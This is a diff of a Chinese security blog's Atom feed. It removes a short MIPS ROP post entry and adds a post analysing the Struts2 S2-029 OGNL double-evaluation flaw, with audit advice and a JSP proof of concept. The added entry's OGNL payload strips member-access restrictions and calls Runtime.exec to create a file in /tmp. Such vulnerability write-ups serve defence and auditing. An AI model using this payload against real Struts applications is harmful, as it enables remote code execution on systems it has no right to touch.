@@ -478,29 +478,6 @@ cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
   </entry>
   
   <entry>
-    <title>mips架构缓冲区溢出学习二</title>
-    <link href="http://xdxd.love/2016/09/18/mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%BA%8C/"/>
-    <id>http://xdxd.love/2016/09/18/mips架构缓冲区溢出学习二/</id>
-    <published>2016-09-18T01:59:49.000Z</published>
-    <updated>2016-09-20T02:56:35.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">mips架构缓冲区溢出学习一</a>中介绍了mips栈溢出的基本原理。这里介绍一下ROP的方式实现命令执行。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA
-    
-    </summary>
-    
-      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-    
-      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
-    
-  </entry>
-  
-  <entry>
     <title>w3school上示例代码的安全漏洞</title>
     <link href="http://xdxd.love/2016/09/14/w3school%E4%B8%8A%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
     <id>http://xdxd.love/2016/09/14/w3school上示例代码的安全漏洞/</id>
@@ -1225,6 +1202,58 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
     
     
       <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>struts2 s2-029 漏洞</title>
+    <link href="http://xdxd.love/2016/03/21/struts2-s2-029-%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://xdxd.love/2016/03/21/struts2-s2-029-漏洞/</id>
+    <published>2016-03-21T02:14:55.000Z</published>
+    <updated>2016-03-22T08:23:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
+<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="built_in">values</span> assigned <span class="keyword">to</span> certain <span class="keyword">tags</span> <span class="keyword">so</span> it <span class="keyword">is</span> possible <span class="keyword">to</span> pass in <span class="keyword">a</span> value that will <span class="keyword">be</span> evaluated again when <span class="keyword">a</span> <span class="keyword">tag</span>’<span class="keyword">s</span> attributes will <span class="keyword">be</span> rendered.
+</code></pre><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p>
+<p>比如：</p>
+<pre><code><span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
+<span class="tag">&lt;<span class="title">set</span> <span class="attribute">var</span>=<span class="value">"%&amp;#123#parameters.tang3&amp;#125"</span>/&gt;</span>
+</code></pre><p>通过<code>%&amp;#123#&amp;#125</code>的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了<code>%&amp;#123&amp;#125</code>形式的字符串的ognl解析。</p>
+<p><img src="/images/struts0291.png" alt=""></p>
+<pre><code>这段代码的修改用来处理掉了非%&amp;<span class="preprocessor">#<span class="number">123</span>开头，&amp;#<span class="number">125</span>结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#<span class="number">1232</span>+<span class="number">3</span>&amp;#<span class="number">125</span>，在修改之前的代码中<span class="number">2</span>+<span class="number">3</span>是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</span>
+</code></pre><p>审计方式就是查看是否有<code>%&amp;#123#&amp;#125</code>这种方式获取用户输入变量复制给标签属性的代码写法。</p>
+<p>测试代码：</p>
+<pre><code><span class="xml"></span>&lt;%<span class="perl"><span class="variable">@page</span> import=<span class="string">"java.util.HashSet"</span></span>%&gt;<span class="xml">
+</span>&lt;%<span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span>%&gt;<span class="xml">
+</span>&lt;%<span class="perl">@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> </span>%&gt;<span class="xml">
+<span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>Demo jsp page<span class="tag">&lt;/<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">head</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+</span>&lt;%<span class="perl">
+  request.setAttribute(<span class="string">"lan"</span>, <span class="string">"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=<span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>(),#a.exec('touch /tmp/1111'),new java.lang.String('"</span>);
+</span>%&gt;<span class="xml">
+<span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span></span>
+</code></pre><p><img src="/images/struts0292.png" alt=""></p>
+<p>查看tmp目录文件已经生成。</p>
+<p><img src="/images/struts0293.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/" target="_blank" rel="external">http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/</a></p>
+<p><a href="http://seclab.dbappsecurity.com.cn/?p=678" target="_blank" rel="external">http://seclab.dbappsecurity.com.cn/?p=678</a></p>
+<p><a href="http://www.freebuf.com/vuls/99234.html" target="_blank" rel="external">http://www.freebuf.com/vuls/99234.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;The Apache Struts frameworks performs double evaluation of attributes &lt;span class=&quot;buil
+    
+    </summary>
+    
+      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="java" scheme="http://xdxd.love/tags/java/"/>
     
   </entry>
   
